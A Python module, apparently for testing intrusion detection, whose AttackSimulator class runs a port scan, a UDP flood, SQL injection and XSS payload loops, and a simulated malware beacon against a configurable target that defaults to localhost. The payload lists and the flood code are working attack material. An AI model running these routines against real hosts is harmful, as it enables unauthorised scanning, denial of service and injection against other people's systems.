"""
Attack Simulator Module - Simulates various network attacks
"""
import threading
import time
import socket
import random
import os
import requests
from urllib.parse import quote

class AttackSimulator:
    def __init__(self, target_ip="127.0.0.1", callback=None):
        self.target_ip = target_ip
        self.callback = callback
        self.running_attacks = {}
        
    def _log_attack(self, attack_type, details):
        """Log attack event"""
        event = {
            'type': attack_type,
            'timestamp': time.time(),
            'target': self.target_ip,
            'details': details
        }
        if self.callback:
            self.callback(event)
        return event
    
    def port_scan(self, ports=None, duration=10):
        """Simulate port scanning attack"""
        if ports is None:
            ports = [22, 23, 80, 135, 139, 443, 445, 3389, 8080, 8888]
        
        def scan_worker():
            scanned = []
            start_time = time.time()
            
            while time.time() - start_time < duration:
                for port in ports:
                    if time.time() - start_time >= duration:
                        break
                    
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        result = sock.connect_ex((self.target_ip, port))
                        scanned.append(port)
                        
                        if result == 0:
                            self._log_attack('port_scan', {
                                'port': port,
                                'status': 'open',
                                'scan_count': len(scanned)
                            })
                        sock.close()
                    except:
                        pass
                    
                    time.sleep(0.1)
            
            self._log_attack('port_scan', {
                'status': 'completed',
                'ports_scanned': len(scanned),
                'duration': duration
            })
        
        thread = threading.Thread(target=scan_worker, daemon=True)
        thread.start()
        self.running_attacks['port_scan'] = thread
        return thread
    
    def sql_injection(self, target_url=None, duration=5):
        """Simulate SQL injection attack"""
        if target_url is None:
            target_url = f"http://{self.target_ip}:8888"
        
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "admin'--",
            "' OR 1=1--",
            "1' AND '1'='1",
            "1' OR '1'='1'--",
            "' OR 'x'='x",
            "admin' OR '1'='1",
            "' UNION SELECT * FROM users--"
        ]
        
        def inject_worker():
            start_time = time.time()
            attempts = 0
            
            while time.time() - start_time < duration:
                payload = random.choice(payloads)
                attempts += 1
                
                try:
                    # Try GET request
                    url = f"{target_url}/login?user={quote(payload)}&pass={quote(payload)}"
                    response = requests.get(url, timeout=2)
                    
                    self._log_attack('sql_injection', {
                        'payload': payload,
                        'url': url,
                        'status_code': response.status_code,
                        'attempt': attempts
                    })
                except Exception as e:
                    self._log_attack('sql_injection', {
                        'payload': payload,
                        'error': str(e),
                        'attempt': attempts
                    })
                
                time.sleep(0.5)
        
        thread = threading.Thread(target=inject_worker, daemon=True)
        thread.start()
        self.running_attacks['sql_injection'] = thread
        return thread
    
    def ddos_attack(self, target_port=8888, duration=10, intensity=10):
        """Simulate DDoS attack using UDP flood"""
        def flood_worker():
            start_time = time.time()
            packets_sent = 0
            
            while time.time() - start_time < duration:
                threads = []
                for _ in range(intensity):
                    def send_udp_packet():
                        try:
                            # UDP flood to target port
                            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            sock.settimeout(0.1)
                            # Send random UDP data
                            data = os.urandom(1024)  # Random 1KB payload
                            sock.sendto(data, (self.target_ip, target_port))
                            sock.close()
                            nonlocal packets_sent
                            packets_sent += 1
                        except:
                            pass
                    
                    t = threading.Thread(target=send_udp_packet, daemon=True)
                    t.start()
                    threads.append(t)
                
                for t in threads:
                    t.join(timeout=0.5)
                
                if packets_sent % 50 == 0:
                    self._log_attack('ddos', {
                        'packets_sent': packets_sent,
                        'target_port': target_port,
                        'intensity': intensity,
                        'type': 'UDP_flood'
                    })
                
                time.sleep(0.05)  # Faster for UDP flood
            
            self._log_attack('ddos', {
                'status': 'completed',
                'total_packets': packets_sent,
                'duration': duration,
                'type': 'UDP_flood'
            })
        
        thread = threading.Thread(target=flood_worker, daemon=True)
        thread.start()
        self.running_attacks['ddos'] = thread
        return thread
    
    def xss_attack(self, target_url=None, duration=5):
        """Simulate XSS attack"""
        if target_url is None:
            target_url = f"http://{self.target_ip}:8888"
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        ]
        
        def xss_worker():
            start_time = time.time()
            attempts = 0
            
            while time.time() - start_time < duration:
                payload = random.choice(payloads)
                attempts += 1
                
                try:
                    url = f"{target_url}/search?q={quote(payload)}"
                    response = requests.get(url, timeout=2)
                    
                    self._log_attack('xss', {
                        'payload': payload,
                        'url': url,
                        'status_code': response.status_code,
                        'attempt': attempts
                    })
                except Exception as e:
                    self._log_attack('xss', {
                        'payload': payload,
                        'error': str(e),
                        'attempt': attempts
                    })
                
                time.sleep(0.5)
        
        thread = threading.Thread(target=xss_worker, daemon=True)
        thread.start()
        self.running_attacks['xss'] = thread
        return thread
    
    def malware_c2(self, target_port=8888, duration=10):
        """Simulate malware C2 (Command & Control) communication with high-entropy random bytes"""
        def c2_worker():
            start_time = time.time()
            beacons = 0
            
            while time.time() - start_time < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.target_ip, target_port))
                    
                    # Simulate high-entropy C2 beacon (random bytes to simulate encryption/obfuscation)
                    # Generate random high-entropy payload (256-512 bytes)
                    beacon_size = random.randint(256, 512)
                    high_entropy_beacon = os.urandom(beacon_size)
                    
                    # Add some structure to make it look like C2 protocol
                    header = f"BEACON|{int(time.time())}|".encode()
                    footer = f"|STATUS=ACTIVE".encode()
                    full_beacon = header + high_entropy_beacon + footer
                    
                    sock.send(full_beacon)
                    
                    response = sock.recv(1024)
                    beacons += 1
                    
                    self._log_attack('malware_c2', {
                        'beacon_size': len(full_beacon),
                        'entropy': 'high',
                        'response': response.decode('utf-8', errors='ignore')[:100] if response else 'none',
                        'beacon_count': beacons
                    })
                    
                    sock.close()
                except Exception as e:
                    self._log_attack('malware_c2', {
                        'error': str(e),
                        'beacon_count': beacons
                    })
                
                time.sleep(2)
            
            self._log_attack('malware_c2', {
                'status': 'completed',
                'total_beacons': beacons,
                'duration': duration
            })
        
        thread = threading.Thread(target=c2_worker, daemon=True)
        thread.start()
        self.running_attacks['malware_c2'] = thread
        return thread
    
    def stop_all(self):
        """Stop all running attacks"""
        self.running_attacks.clear()

